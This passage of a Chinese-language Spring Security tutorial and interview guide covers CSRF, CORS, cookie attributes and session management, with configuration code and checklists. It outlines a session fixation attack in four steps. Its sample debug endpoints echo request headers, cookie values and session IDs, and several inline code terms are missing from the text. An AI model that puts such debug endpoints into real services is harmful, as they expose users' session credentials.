    @Order(2)
    public SecurityFilterChain webSecurityFilterChain(HttpSecurity http) 
            throws Exception {
        http
            .securityMatcher("/**")
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            )  // Web 启用 CSRF
            .authorizeHttpRequests(authz -> authz
                .anyRequest().authenticated()
            )
            .formLogin(form -> form
                .loginPage("/login")
                .permitAll()
            );
        
        return http.build();
    }
}
```

## 会话安全要关注什么

无论是 Session 还是 Token,会话安全都至少要考虑：

- 登录成功后的凭证管理
- 失效与过期
- 登出后是否真的不可用
- 多端登录和撤销策略
- Cookie 的 、、

这也是为什么安全问题不能只看"能不能登录成功"。

### Cookie 安全属性

**HttpOnly**
```java
// 防止 JavaScript 读取 Cookie
Cookie cookie = new Cookie("SESSION", sessionId);
cookie.setHttpOnly(true);  // XSS 攻击无法窃取 Cookie
```

**Secure**
```java
// 仅通过 HTTPS 传输
cookie.setSecure(true);  // 防止中间人攻击
```

**SameSite**
```java
// 控制跨站请求是否携带 Cookie
cookie.setAttribute("SameSite", "Strict");  // 或 "Lax", "None"

/*
Strict: 仅同站请求携带 Cookie
Lax: 允许顶级导航的 GET 请求携带 Cookie
None: 允许所有跨站请求携带 Cookie(需要 Secure)
*/
```

**Spring Session Cookie 配置：**
```java
@Bean
public CookieSerializer cookieSerializer() {
    DefaultCookieSerializer serializer = new DefaultCookieSerializer();
    serializer.setCookieName("SESSION");
    serializer.setUseHttpOnlyCookie(true);
    serializer.setSameSite("Strict");
    serializer.setUseSecureCookie(true);
    return serializer;
}
```

### Session 固定攻击防护

**攻击原理：**
```
1. 攻击者获取 Session ID: ABC123
2. 诱导受害者使用该 Session ID 登录
   https://bank.com/login?SESSION=ABC123
3. 受害者登录成功,Session ABC123 被授权
4. 攻击者使用 ABC123 访问受害者的账户
```

**Spring Security 防护：**

```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) 
        throws Exception {
    http
        .sessionManagement(session -> session
            .sessionFixation(sessionFixation -> 
                sessionFixation.migrateSession()  // 登录时迁移 Session
                // 或 newSession() - 创建新 Session
                // 或 none() - 不做防护(不推荐)
            )
        );
    
    return http.build();
}
```

**migrateSession vs newSession:**
- :保留 Session 属性，创建新 Session ID
- :创建全新的 Session,丢弃所有属性

### Session 并发控制

```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) 
        throws Exception {
    http
        .sessionManagement(session -> session
            .maximumSessions(1)  // 每个用户只能有一个活跃 Session
            .maxSessionsPreventsLogin(false)  // 踢掉旧登录
            .sessionRegistry(sessionRegistry())
        );
    
    return http.build();
}

@Bean
public SessionRegistry sessionRegistry() {
    return new SessionRegistryImpl();
}

// 监听 Session 创建和销毁
@Bean
public HttpSessionEventPublisher httpSessionEventPublisher() {
    return new HttpSessionEventPublisher();
}
```

### Session 超时配置

```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) 
        throws Exception {
    http
        .sessionManagement(session -> session
            .invalidSessionUrl("/login?expired")  // Session 过期重定向
        );
    
    return http.build();
}

// application.yml
server:
  servlet:
    session:
      timeout: 30m  # Session 超时时间
```

### Redis Session 配置

```java
@Configuration
@EnableRedisHttpSession
public class RedisSessionConfig {
    
    @Bean
    public LettuceConnectionFactory redisConnectionFactory() {
        return new LettuceConnectionFactory();
    }
    
    @Bean
    public CookieSerializer cookieSerializer() {
        DefaultCookieSerializer serializer = new DefaultCookieSerializer();
        serializer.setCookieName("SESSION");
        serializer.setUseHttpOnlyCookie(true);
        serializer.setSameSite("Strict");
        return serializer;
    }
}
```

```yaml
# application.yml
spring:
  session:
    redis:
      namespace: "myapp:session"
    timeout: 30m
```

## 排查与治理思路

### 排查重点

遇到安全边界问题时，优先看：

- 当前认证模式是 Session 还是 Token
- 浏览器是否会自动带上凭证
- 跨域失败是浏览器限制还是后端鉴权失败
- 登出后会话或 Token 是否真的失效

**排查工具：**

```java
// 1. 打印请求头
@GetMapping("/debug/headers")
public ResponseEntity<?> debugHeaders(HttpServletRequest request) {
    Map<String, String> headers = new HashMap<>();
    Collections.list(request.getHeaderNames())
        .forEach(name -> headers.put(name, request.getHeader(name)));
    return ResponseEntity.ok(headers);
}

// 2. 打印 Cookie
@GetMapping("/debug/cookies")
public ResponseEntity<?> debugCookies(HttpServletRequest request) {
    Cookie[] cookies = request.getCookies();
    if (cookies == null) {
        return ResponseEntity.ok("No cookies");
    }
    
    List<Map<String, Object>> cookieList = Arrays.stream(cookies)
        .map(cookie -> Map.of(
            "name", cookie.getName(),
            "value", cookie.getValue(),
            "domain", cookie.getDomain(),
            "path", cookie.getPath(),
            "secure", cookie.getSecure(),
            "httpOnly", cookie.isHttpOnly()
        ))
        .collect(Collectors.toList());
    
    return ResponseEntity.ok(cookieList);
}

// 3. 打印 Session 信息
@GetMapping("/debug/session")
public ResponseEntity<?> debugSession(HttpServletRequest request) {
    HttpSession session = request.getSession(false);
    if (session == null) {
        return ResponseEntity.ok("No session");
    }
    
    return ResponseEntity.ok(Map.of(
        "id", session.getId(),
        "creationTime", session.getCreationTime(),
        "lastAccessedTime", session.getLastAccessedTime(),
        "maxInactiveInterval", session.getMaxInactiveInterval(),
        "attributes", Collections.list(session.getAttributeNames())
    ));
}
```

### 治理重点

-  和认证授权分开治理
- 需要自动携带凭证的场景重点考虑 
- 登出、过期、失效、刷新策略要完整
- 不要为了"先跑起来"把安全开关全部关闭

**安全检查清单：**

```markdown
## CORS 安全检查清单

### 配置检查
- [ ] 是否明确指定允许的来源
- [ ] 是否限制允许的方法
- [ ] 是否限制允许的请求头
- [ ] 是否明确是否允许凭证
- [ ] 是否设置了预检缓存时间

### 测试检查
- [ ] 测试未授权来源是否被拒绝
- [ ] 测试预检请求是否正确响应
- [ ] 测试跨域请求是否携带 Cookie
- [ ] 测试跨域错误是否被正确处理

## CSRF 安全检查清单

### 配置检查
- [ ] 是否根据认证模式启用/禁用 CSRF
- [ ] CSRF Token 是否正确传递给前端
- [ ] 前端是否正确添加 Token 到请求
- [ ] 是否忽略了不必要的路径

### 测试检查
- [ ] 测试无 Token 的请求是否被拒绝
- [ ] 测试错误 Token 的请求是否被拒绝
- [ ] 测试 Token 过期后的行为
- [ ] 测试并发请求的 Token 处理

## 会话安全检查清单

### Cookie 安全
- [ ] 所有 Cookie 都设置了 HttpOnly
- [ ] 所有 Cookie 都设置了 Secure
- [ ] 关键 Cookie 设置了 SameSite
- [ ] Cookie 路径设置正确

### Session 管理
- [ ] Session 超时时间合理
- [ ] 登出后 Session 立即失效
- [ ] Session 固定攻击防护已启用
- [ ] Session 并发控制已配置

### Token 管理
- [ ] Token 有效期合理
- [ ] 登出后 Token 加入黑名单
- [ ] Token 泄露可撤销
- [ ] Refresh Token 安全存储
```

## 常见误区

### 误区一：把 CORS 当成权限控制

**问题：**
```java
// × 错误:只配置 CORS,不配置权限
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) {
    http
        .cors(cors -> cors.configurationSource(corsConfigurationSource()))
        // 没有配置授权规则
    return http.build();
}
```

**正确理解：**
- CORS 是浏览器跨域访问规则
- 权限控制是服务端的安全逻辑
- 两者应该独立配置

```java
// √ 正确:CORS 和权限分别配置
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) {
    http
        .cors(cors -> cors.configurationSource(corsConfigurationSource()))
        .authorizeHttpRequests(authz -> authz
            .requestMatchers("/admin/**").hasRole("ADMIN")
            .anyRequest().authenticated()
        );
    return http.build();
}
```

### 误区二：遇到前后端分离就默认关掉所有 CSRF

**问题：**
```java
// × 错误:不分析场景直接禁用 CSRF
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) {
    http.csrf(csrf -> csrf.disable());
    return http.build();
}
```

**正确分析：**
```
前后端分离 + JWT(Token 在请求头)
  → CSRF 风险低,可以禁用

前后端分离 + Session(Cookie 认证)
  → CSRF 风险高,不应禁用

前后端分离 + JWT(但 Token 在 Cookie 中)
  → CSRF 风险高,需要启用防护
```

### 误区三：Session、Cookie、Token 边界不清

**问题：**
- 混淆 Session 和 Cookie
- 不理解 Token 和 Session 的区别
- 配置了 JWT 但仍然依赖 Session

**正确理解：**
```
Session:服务端存储的会话状态
Cookie:浏览器存储的小数据片段
Token:无状态的认证凭证

Session 模式:
Session 存服务端,Cookie 存 Session ID

JWT 模式:
Token 包含所有信息,无需服务端存储
```

### 误区四：只关注登录成功，不关注登出和失效路径

**问题：**
```java
// × 登出只是返回成功,实际 Token 仍可用
@PostMapping("/logout")
public ResponseEntity<?> logout() {
    return ResponseEntity.ok("Logged out");
}
```

**正确做法：**
```java
// √ 登出时使 Session 或 Token 真正失效
@PostMapping("/logout")
public ResponseEntity<?> logout(
        HttpServletRequest request,
        HttpServletResponse response,
        @RequestHeader(value = "Authorization", required = false) String authHeader) {
    
    // Session 模式
    HttpSession session = request.getSession(false);
    if (session != null) {
        session.invalidate();
    }
    
    // JWT 模式
    if (authHeader != null && authHeader.startsWith("Bearer ")) {
        String token = authHeader.substring(7);
        tokenBlacklistService.addToBlacklist(token);
    }
    
    // 清除 Cookie
    CookieClearingLogoutHandler handler = 
        new CookieClearingLogoutHandler("SESSION", "remember-me");
    handler.logout(request, response, null);
    
    return ResponseEntity.ok().build();
}
```

### 误区五：看到浏览器报跨域错误，就误以为一定是后端权限问题

**问题：**
```
浏览器错误:
Access to XMLHttpRequest at 'https://api.example.com/users' 
from origin 'https://www.example.com' has been blocked by CORS policy
```

开发者误认为是后端拒绝了请求，实际是浏览器拦截了响应。

**正确排查：**
```
1. 检查是否是 CORS 问题
   - 错误信息包含 "CORS policy"
   - Network 面板显示请求发送成功
   - Response 正常但前端无法读取

2. 检查 CORS 配置
   - Access-Control-Allow-Origin 是否正确
   - 是否允许携带凭证
   - 预检请求是否正确处理

3. 检查认证问题
   - 错误信息是 401/403
   - Network 面板显示请求失败
   - Response 包含错误信息
```

## 面试要点

### 基础问题

**1. CSRF 和 CORS 分别解决什么问题？**

答：

**CSRF（Cross-Site Request Forgery,跨站请求伪造）:**
- 防止恶意网站借用用户身份发起请求
- 核心问题是浏览器会自动携带 Cookie
- 防护手段是 CSRF Token 验证

**CORS（Cross-Origin Resource Sharing,跨源资源共享）:**
- 解决浏览器跨域访问限制
- 核心问题是同源策略限制了跨域请求
- 通过服务器响应头控制跨域访问规则

**区别：**
- CSRF 是安全漏洞，需要防护
- CORS 是浏览器安全策略，需要配置

**2. 为什么 Session 模式更要关注 CSRF?**

答：
Session 模式下：
1. **Cookie 自动携带**：浏览器会自动在请求中携带目标域名的 Cookie,恶意网站也可以触发。
2. **无法区分来源**：服务器无法区分请求是用户主动发起还是被诱导发起。
3. **影响严重**：攻击者可以借用户身份执行转账、修改密码等敏感操作。

JWT 模式下（如果 Token 不在 Cookie 中）:
1. **手动添加**：Token 需要前端手动添加到请求头。
2. **无法窃取**：恶意网站无法获取 Token（XSS 除外）。
3. **风险较低**：CSRF 攻击条件不满足。

**3. 前后端分离项目里什么时候可以弱化 CSRF 风险讨论？**

答：
可以弱化 CSRF 风险讨论的条件：
1. **JWT Token 认证**：Token 不存储在 Cookie 中，由前端手动添加到请求头。
2. **无状态架构**：不依赖 Session,服务器不保存会话状态。
3. **Token 存储安全**：Token 存储在内存或 HttpOnly Cookie（需要手动设置到请求头）。

**但需要注意：**
- 如果 JWT 存储在 Cookie 中，仍然需要 CSRF 防护。
- 如果有 XSS 漏洞，Token 可能被窃取。
- Refresh Token 的安全存储也很重要。

**4. 为什么 CORS 配置不能简单全开？**

答：
CORS 全开（Allow-Origin: *）的风险：
1. **任意网站可访问**：所有网站都可以调用你的 API。
2. **数据泄露**：恶意网站可以读取用户的敏感数据。
3. **CSRF 风险**：如果允许凭证（Allow-Credentials: true）,恶意网站可以借用用户身份。

**正确配置：**
- 明确指定允许的来源。
- 只开放必要的请求方法和头。
- 根据是否需要凭证，正确设置 Allow-Credentials。

### 进阶问题

**5. 描述 CSRF Token 防护机制的完整流程。**

答：

**1. Token 生成：**
```
服务器生成随机 Token
  ↓
绑定到用户 Session
  ↓
存储在服务端(Session 或 Cookie)
```

**2. Token 分发：**
```
方式一:表单隐藏字段
<form>
  <input type="hidden" name="_csrf" value="token-value"/>
</form>

方式二:Cookie
Set-Cookie: XSRF-TOKEN=token-value; Path=/
```

**3. Token 提交：**
```
方式一:表单参数
POST /transfer
_csrf=token-value&to=account&amount=100

方式二:请求头
POST /transfer
X-XSRF-TOKEN: token-value
```

**4. Token 验证：**
```
服务器提取请求中的 Token
  ↓
对比 Session 中的 Token
  ↓
匹配 → 请求通过
不匹配 → 拒绝请求(403)
```

**5. Token 刷新：**
```
每次请求后可选择生成新 Token
  ↓
确保 Token 一次性使用
  ↓
防止重放攻击
```

**6. CORS 预检请求是什么？为什么要预检？**

答：

**预检请求（Preflight Request）:**
不符合"简单请求"条件的跨域请求，浏览器会先发送一个 OPTIONS 请求，询问服务器是否允许实际请求。

**触发条件：**
- 请求方法不是 GET、POST、HEAD
- 请求头包含自定义头（如 Authorization）
- Content-Type 不是 application/x-www-form-urlencoded、multipart/form-data、text/plain

**预检流程：**
```
1. 浏览器发送 OPTIONS 请求
   OPTIONS /api/users
   Origin: https://www.example.com
   Access-Control-Request-Method: POST
   Access-Control-Request-Headers: Content-Type, Authorization

2. 服务器响应允许
   Access-Control-Allow-Origin: https://www.example.com
   Access-Control-Allow-Methods: POST, GET, PUT, DELETE
   Access-Control-Allow-Headers: Content-Type, Authorization
   Access-Control-Max-Age: 3600

3. 浏览器发送实际请求
   POST /api/users
   Origin: https://www.example.com
   Content-Type: application/json
   Authorization: Bearer xxx

4. 服务器响应实际请求
```

**为什么要预检：**
1. **保护旧服务器**：一些旧服务器可能不支持某些请求方法或头，预检可以避免发送可能破坏服务器状态的请求。
2. **提前验证**：在实际请求发送前，先确认服务器是否允许该跨域请求。
3. **减少风险**：避免直接发送可能携带用户数据的请求，先确认权限。

**7. Cookie 的 SameSite 属性有哪些值？各有什么作用？**

答：

**Strict:**
```
Set-Cookie: SESSION=abc123; SameSite=Strict
```
- 仅在同站请求中携带 Cookie
- 完全阻止跨站请求携带 Cookie
- 防护 CSRF 最强
- 但用户体验较差（例如从邮件链接进入网站需要重新登录）

**Lax（推荐）:**
```
Set-Cookie: SESSION=abc123; SameSite=Lax
```
- 允许顶级导航的 GET 请求携带 Cookie
- 例如：从外部链接点击进入网站
- 阻止跨站的 POST、iframe、AJAX 请求携带 Cookie
- 平衡了安全性和用户体验

**None:**
```
Set-Cookie: SESSION=abc123; SameSite=None; Secure
```
- 允许所有跨站请求携带 Cookie
- 必须同时设置 Secure（仅 HTTPS）
- 需要 CORS Allow-Credentials: true
- 存在 CSRF 风险，需要额外防护

**对比表：**

| 请求类型 | Strict | Lax | None |
|---|---|---|---|
| 同站请求 | √ 携带 | √ 携带 | √ 携带 |
| 跨站顶级导航 GET | × 不携带 | √ 携带 | √ 携带 |
| 跨站表单 POST | × 不携带 | × 不携带 | √ 携带 |
| 跨站 AJAX | × 不携带 | × 不携带 | √ 携带 |
| 跨站 iframe | × 不携带 | × 不携带 | √ 携带 |

**8. 如何在 Spring Security 中配置 Session 并发控制？**

答：

**单设备登录（踢掉旧登录）:**
```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) 
        throws Exception {
    http
        .sessionManagement(session -> session
            .maximumSessions(1)  // 每个用户只能有一个 Session
            .maxSessionsPreventsLogin(false)  // 新登录踢掉旧登录
            .sessionRegistry(sessionRegistry())
        );
    
    return http.build();
}

@Bean
public SessionRegistry sessionRegistry() {
    return new SessionRegistryImpl();
}

@Bean
public HttpSessionEventPublisher httpSessionEventPublisher() {
    return new HttpSessionEventPublisher();
}
```

**单设备登录（阻止新登录）:**
```java
.sessionManagement(session -> session
    .maximumSessions(1)
    .maxSessionsPreventsLogin(true)  // 已登录则阻止新登录
    .sessionRegistry(sessionRegistry())
)
```

**多设备登录限制：**
```java
.sessionManagement(session -> session
    .maximumSessions(3)  // 最多 3 个设备
    .maxSessionsPreventsLogin(false)
    .sessionRegistry(sessionRegistry())
)
```

**自定义会话过期处理：**
```java
.sessionManagement(session -> session
    .maximumSessions(1)
    .expiredSessionStrategy(event -> {
        HttpServletResponse response = event.getResponse();
        response.setContentType("application/json;charset=UTF-8");
        response.getWriter().write(
            "{\"error\":\"Session expired\",\"code\":401}"
        );
    })
)
```

**监听会话事件：**
```java
@Component
public class SessionEventListener {
    
    @EventListener
    public void onSessionCreated(SessionCreatedEvent event) {
        String sessionId = event.getSessionId();
        log.info("Session created: {}", sessionId);
    }

    @EventListener
    public void onSessionDestroyed(SessionDestroyedEvent event) {
        String sessionId = event.getSessionId();
        log.info("Session destroyed: {}", sessionId);
    }
}
```

### 实战问题

**9. 如何排查 CORS 跨域问题？**

答：

**排查步骤：**

**1. 确认是 CORS 问题：**
```
错误特征:
- 浏览器控制台显示 "CORS policy" 错误
- Network 面板显示请求已发送
- Response 正常但前端无法读取
```

**2. 检查请求类型：**
```javascript
// 检查是否触发了预检
console.log('Request method:', method);
console.log('Request headers:', headers);

// 如果是预检失败,检查 OPTIONS 请求
// Network 面板查找 OPTIONS 请求
```

**3. 检查服务器配置：**
```bash
# 使用 curl 测试 CORS
curl -i -X OPTIONS https://api.example.com/users \
  -H "Origin: https://www.example.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type"

# 检查响应头
# 应该包含:
# Access-Control-Allow-Origin: https://www.example.com
# Access-Control-Allow-Methods: POST, GET, PUT, DELETE
# Access-Control-Allow-Headers: Content-Type
```

**4. 常见问题解决：**

**问题一：Origin 不匹配**
```
配置: Access-Control-Allow-Origin: https://example.com
请求: Origin: https://www.example.com
解决: 确保域名完全一致,包括 www 前缀
```

**问题二：Allow-Credentials 与通配符冲突**
```
× 错误配置:
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

√ 正确配置:
Access-Control-Allow-Origin: https://www.example.com
Access-Control-Allow-Credentials: true
```

**问题三：预检缓存过期**
```
解决方案:增加 Max-Age
Access-Control-Max-Age: 3600
```

**问题四：Spring Security 拦截预检请求**
```java
// 放行 OPTIONS 请求
.authorizeHttpRequests(authz -> authz
    .requestMatchers(HttpMethod.OPTIONS, "/**").permitAll()
    .anyRequest().authenticated()
)
```

**10. 如何设计安全的登出流程？**

答：

**完整登出流程：**

```java
@RestController
@RequestMapping("/auth")
public class LogoutController {
    
    @Autowired
    private TokenBlacklistService tokenBlacklistService;
    
    @Autowired
    private SessionRegistry sessionRegistry;
    
    @PostMapping("/logout")
    public ResponseEntity<?> logout(
            HttpServletRequest request,
            HttpServletResponse response,
            @RequestHeader(value = "Authorization", required = false) String authHeader) {
        
        // 1. 处理 JWT Token
        if (authHeader != null && authHeader.startsWith("Bearer ")) {
            String token = authHeader.substring(7);
            
            // 解析 Token 获取过期时间
            Claims claims = jwtTokenProvider.parseToken(token);
            long expirationTime = claims.getExpiration().getTime();
            
            // 将 Token 加入黑名单
            tokenBlacklistService.addToBlacklist(token, expirationTime);
        }
        
        // 2. 处理 Session
        HttpSession session = request.getSession(false);
        if (session != null) {
            // 使 Session 失效
            session.invalidate();
            
            // 从 SessionRegistry 中移除
            Authentication auth = SecurityContextHolder.getContext().getAuthentication();
            if (auth != null) {
                sessionRegistry.removeSessionInformation(session.getId());
            }
        }
        
        // 3. 清除 Remember-Me Cookie
        CookieClearingLogoutHandler cookieLogoutHandler = 
            new CookieClearingLogoutHandler("JSESSIONID", "remember-me");
        cookieLogoutHandler.logout(request, response, null);
        
        // 4. 清除 SecurityContext
        SecurityContextHolder.clearContext();
        
        // 5. 记录审计日志
        auditService.logLogout(request.getRemoteAddr());
        
        return ResponseEntity.ok().build();
    }
    
    // 登出所有设备
    @PostMapping("/logout-all")
    public ResponseEntity<?> logoutAll(Authentication auth) {
        String userId = auth.getName();
        
        // 撤销所有 Refresh Token
        tokenBlacklistService.revokeAllUserTokens(userId);
        
        // 使所有 Session 失效
        sessionRegistry.getAllSessions(auth, false)
            .forEach(SessionInformation::expireNow);
        
        return ResponseEntity.ok().build();
    }
}
```

**前端处理：**
```javascript
async function logout() {
  try {
    await api.post('/auth/logout');
  } finally {
    // 无论请求成功与否,都清除本地存储
    localStorage.removeItem('access_token');
    sessionStorage.clear();
    
    // 清除 Cookie(如果 Token 在 Cookie 中)
    Cookies.remove('refresh_token');
    
    // 跳转到登录页
    window.location.href = '/login';
  }
}
```

**11. 如何实现 Session 集群共享？**

答：

**方案一：Spring Session + Redis**

```xml
<dependency>
    <groupId>org.springframework.session</groupId>
    <artifactId>spring-session-data-redis</artifactId>
</dependency>
```

```java
@Configuration
@EnableRedisHttpSession
public class RedisSessionConfig {
    
    @Bean
    public LettuceConnectionFactory redisConnectionFactory() {
        return new LettuceConnectionFactory(
            new RedisStandaloneConfiguration("redis-host", 6379)
        );
    }
    
    @Bean
    public CookieSerializer cookieSerializer() {
        DefaultCookieSerializer serializer = new DefaultCookieSerializer();
        serializer.setCookieName("SESSION");
        serializer.setUseHttpOnlyCookie(true);
        serializer.setSameSite("Lax");
        serializer.setUseSecureCookie(true);
        return serializer;
    }
}
```

```yaml
spring:
  session:
    redis:
      namespace: "myapp:session"
    timeout: 30m
  redis:
    host: redis-host
    port: 6379
```

**方案二：Spring Session + JDBC**

```xml
<dependency>
    <groupId>org.springframework.session</groupId>
    <artifactId>spring-session-jdbc</artifactId>
</dependency>
```

```java
@Configuration
@EnableJdbcHttpSession
public class JdbcSessionConfig {
    // 自动创建表 SPRING_SESSION 和 SPRING_SESSION_ATTRIBUTES
}
```

```yaml
spring:
  session:
    jdbc:
      initialize-schema: always
      table-name: SPRING_SESSION
    timeout: 30m
```

**方案三：粘性 Session(Sticky Session)**

通过负载均衡器配置，同一用户的请求总是路由到同一服务器。

```
优点:
- 无需额外存储
- 实现简单

缺点:
- 服务器宕机会丢失 Session
- 负载不均衡
- 不适合高可用场景
```

**推荐方案：**
- 生产环境：Spring Session + Redis
- 开发环境：Spring Session + 内存或 JDBC
- 简单场景：JWT 无状态认证

**12. 如何防止 Session 劫持？**

答：

**Session 劫持方式：**
1. **窃取 Session ID**：通过 XSS、网络监听、日志泄露等方式获取。
2. **Session 固定攻击**：攻击者获取 Session ID,诱导用户使用该 ID 登录。
3. **中间人攻击**：在不安全的网络中拦截 Session Cookie。

**防护措施：**

**1. Session 固定攻击防护**
```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) 
        throws Exception {
    http
        .sessionManagement(session -> session
            .sessionFixation(sessionFixation -> 
                sessionFixation.migrateSession()  // 登录时更换 Session ID
            )
        );
    
    return http.build();
}
```

**2. Cookie 安全属性**
```java
@Bean
public CookieSerializer cookieSerializer() {
    DefaultCookieSerializer serializer = new DefaultCookieSerializer();
    serializer.setUseHttpOnlyCookie(true);  // 防止 XSS 读取
    serializer.setUseSecureCookie(true);     // 仅 HTTPS 传输
    serializer.setSameSite("Strict");        // 防止 CSRF
    return serializer;
}
```

**3. Session 绑定设备信息**
```java
@Component
public class SessionSecurityFilter extends OncePerRequestFilter {
    
    @Override
    protected void doFilterInternal(
            HttpServletRequest request,
            HttpServletResponse response,
            FilterChain filterChain) throws ServletException, IOException {
        
        HttpSession session = request.getSession(false);
        if (session != null) {
            // 检查 User-Agent
            String storedAgent = (String) session.getAttribute("user-agent");
            String currentAgent = request.getHeader("User-Agent");
            
            if (storedAgent != null && !storedAgent.equals(currentAgent)) {
                // User-Agent 不匹配,可能是 Session 劫持
                session.invalidate();
                response.sendError(401, "Session invalid");
                return;
            }
            
            // 检查 IP(可选,可能影响移动用户)
            String storedIp = (String) session.getAttribute("ip");
            String currentIp = request.getRemoteAddr();
            
            if (storedIp != null && !storedIp.equals(currentIp)) {
                // IP 不匹配,记录日志
                log.warn("Session IP mismatch: stored={}, current={}", 
                    storedIp, currentIp);
                // 可选:要求重新认证
            }
        }
        
        filterChain.doFilter(request, response);
    }
}
```

**4. Session 超时和刷新**
```yaml
server:
  servlet:
    session:
      timeout: 30m  # 合理的超时时间
```

**5. 审计和监控**
```java
@EventListener
public void onSessionCreated(SessionCreatedEvent event) {
    String sessionId = event.getSessionId();
    HttpServletRequest request = 
        ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes())
            .getRequest();
    
    // 记录 Session 创建日志
    auditService.logSessionCreate(
        sessionId,
        request.getRemoteAddr(),
        request.getHeader("User-Agent")
    );
}

@EventListener
public void onSessionDestroyed(SessionDestroyedEvent event) {
    String sessionId = event.getSessionId();
    auditService.logSessionDestroy(sessionId);
}
```

**6. HTTPS 强制**
```yaml
server:
  ssl:
    enabled: true
  # 强制 HTTPS
  servlet:
    session:
      cookie:
        secure: true
```

## 版本差异（旧版 → Spring Security 6.x）

| 特性 | 旧版（Spring Security 5.x） | Spring Security 6.x |
|------|--------------------------|---------------------|
| CSRF | 默认开启 | 默认开启；6.0 起默认 BREACH 防护（XorCsrfTokenRequestAttributeHandler） |
| CORS | 手动配置 | 不变；支持 CorsConfigurationSource Bean |
| 会话管理 | HttpSession | 不变；虚拟线程下会话线程安全 |
| SameSite | 无 | 默认支持 SameSite=Lax/Strict |
| 安全头 | 默认注入 | 不变 |
